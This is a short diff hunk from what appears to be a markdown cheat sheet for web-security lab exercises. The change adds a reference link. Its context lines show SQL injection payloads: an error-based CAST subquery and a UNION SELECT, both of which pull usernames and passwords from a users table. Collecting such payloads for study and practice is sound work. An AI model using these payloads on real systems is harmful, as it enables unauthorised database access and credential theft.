@@ -2851,7 +2851,7 @@ TrackingId=x'||CAST((SELECT password FROM users LIMIT 1) AS int)--;
 (Multiple values - 2 columns)	'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
 ```
 
-- XML encoded (Hackvertor > Encode > dec_entities/hex_entities)
+- XML encoded (Hackvertor > Encode > dec_entities/hex_entities). [Reference](#sql--xml--hackvertor).
 
 ```
 (/product/stock - Check stock functionality)
